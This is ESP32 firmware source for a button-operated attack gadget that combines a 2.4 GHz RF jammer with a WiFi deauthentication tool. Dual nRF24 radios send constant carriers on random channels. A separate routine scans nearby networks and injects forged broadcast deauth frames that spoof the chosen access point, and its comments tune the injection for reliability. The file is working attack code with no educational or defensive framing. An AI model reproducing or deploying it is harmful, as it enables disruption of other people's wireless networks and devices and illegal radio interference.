// ================= PIN CONFIGURATION =================
const int rfButtonPin = 4;       // GPIO 4: RF Jammer Button
const int rfLedPin = 2;          // GPIO 2: RF Jammer LED Indicator

const int deauthButtonPin = 5;   // GPIO 5: WiFi Deauth Button
const int deauthLedPin = 32;     // GPIO 32: WiFi Deauth LED Indicator

bool isJamming = false;
bool isDeauthing = false;
bool scanExecuted = false;
// ========================================================

// ================= SPI & RF24 INSTANCES =================
SPIClass *sp = nullptr;
SPIClass *hp = nullptr;

RF24 radio(27, 15, 16000000);
RF24 radio1(22, 21, 16000000);

int ch = 45;
int ch1 = 45;
// ========================================================

// ================= Deauth Variables =================
struct WiFiNetwork {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
};

const uint8_t deauthPacket[26] = {
  0xc0, 0x00, 0x3a, 0x01,             // Frame Control, Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination MAC (Broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                         // Sequence Control
  0x07, 0x00                          // Reason Code
};

int networkCount = 0;
int targetChannel = 1;
uint8_t targetBSSID[6];
WiFiNetwork scannedNetworks[20];
uint16_t seqNum = 0;                 // sequence counter for deauth frames
// ========================================================

void disableWiFiAndClassicBT() {
  esp_wifi_stop();
  btStop();
}

// ================= RF JAMMER FUNCTIONS =================
void startJamming() {
  Serial.println("\n>>> RF JAMMER ON: AGGRESSIVE RANDOM MODE STARTED");
  digitalWrite(rfLedPin, HIGH);
  disableWiFiAndClassicBT();
  radio.powerUp();
  radio.startConstCarrier(RF24_PA_MAX, ch);
  radio1.powerUp();
  radio1.startConstCarrier(RF24_PA_MAX, ch1);
}

void stopJamming() {
  Serial.println("\n>>> RF JAMMER OFF: Transmission STOPPED");
  digitalWrite(rfLedPin, LOW);
  radio.powerDown();
  radio1.powerDown();
  WiFi.mode(WIFI_OFF);
  delay(200);
  WiFi.mode(WIFI_AP_STA);
  delay(500);
}

void checkJammerButton() {
  static int lastState = HIGH;
  static unsigned long lastTime = 0;
  int currentState = digitalRead(rfButtonPin);
  if (currentState == LOW && lastState == HIGH && (millis() - lastTime) > 300) {
    lastTime = millis();
    isJamming = !isJamming;
    if (isJamming) {
      if (isDeauthing) stopDeauth();
      startJamming();
    } else {
      stopJamming();
    }
  }
  lastState = currentState;
}

void aggressiveRandomMode() {
  uint8_t randCh1 = random(80);
  uint8_t randCh = random(80);
  radio1.setChannel(randCh1);
  radio.setChannel(randCh);
}
// ========================================================

// ================= DEAUTH FUNCTIONS =================
void startWiFiScan() {
  Serial.println("[*] Scanning for networks... Please wait (3-4 seconds)...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  delay(100);
  networkCount = WiFi.scanNetworks();

  if (networkCount > 0) {
    Serial.println("\n[*] Scanned WiFi Networks:");
    Serial.println("-------------------------------------------------");
    for (int i = 0; i < networkCount && i < 20; i++) {
      scannedNetworks[i].ssid = WiFi.SSID(i);
      memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
      scannedNetworks[i].channel = WiFi.channel(i);
      scannedNetworks[i].rssi = WiFi.RSSI(i);
      Serial.printf("[%02d] SSID: %-20s | Ch: %02d | RSSI: %3d dBm\n",
                    i, scannedNetworks[i].ssid.c_str(), scannedNetworks[i].channel, scannedNetworks[i].rssi);
    }
    Serial.println("-------------------------------------------------");
  } else {
    Serial.println("[!] No networks found! Check antenna or move closer.");
  }
  scanExecuted = true;
}

void startDeauth(int index) {
  if (index < 0 || index >= networkCount) {
    Serial.println("[!] Invalid index! Please run 'scan' first and check the list.");
    return;
  }

  memcpy(targetBSSID, scannedNetworks[index].bssid, 6);
  targetChannel = scannedNetworks[index].channel;

  // *** CRITICAL FIX: injection uses WIFI_IF_AP, so the AP interface MUST exist.
  // Force AP+STA so the AP netif is present before injecting. ***
  WiFi.mode(WIFI_AP_STA);
  delay(100);

  // Lock the radio to the target channel.
  // No promiscuous mode -> no "unsupport frame type" loopback spam.
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

  seqNum = 0;
  Serial.printf("[*] Deauth Started on '%s' (Channel: %d)\n",
                scannedNetworks[index].ssid.c_str(), targetChannel);
  digitalWrite(deauthLedPin, HIGH);
  isDeauthing = true;
}

void sendDeauth() {
  uint8_t packet[26];
  memcpy(packet, deauthPacket, 26);
  memcpy(&packet[10], targetBSSID, 6); // Source MAC = AP BSSID
  memcpy(&packet[16], targetBSSID, 6); // BSSID

  // Set an incrementing sequence number (bytes 22-23) for reliability.
  packet[22] = seqNum & 0xFF;
  packet[23] = (seqNum >> 8) & 0xFF;
  seqNum++;

  // Send a short burst so clients definitely catch it.
  for (int i = 0; i < 3; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), true);
  }
}

void stopDeauth() {
  isDeauthing = false;
  digitalWrite(deauthLedPin, LOW);
  Serial.println("[*] Deauth Stopped!");
}

void checkDeauthButton() {
  static int lastState = HIGH;
  static unsigned long lastTime = 0;
  int currentState = digitalRead(deauthButtonPin);
  if (currentState == LOW && lastState == HIGH && (millis() - lastTime) > 300) {
    lastTime = millis();
    if (!isDeauthing) {
      if (isJamming) { stopJamming(); isJamming = false; }
      WiFi.mode(WIFI_OFF); delay(200); WiFi.mode(WIFI_AP_STA); delay(500);
      if (networkCount == 0 || !scanExecuted) {
        startWiFiScan();
        if (networkCount > 0) { delay(500); startDeauth(0); }
      } else { startDeauth(0); }
    } else { stopDeauth(); }
  }
  lastState = currentState;
}
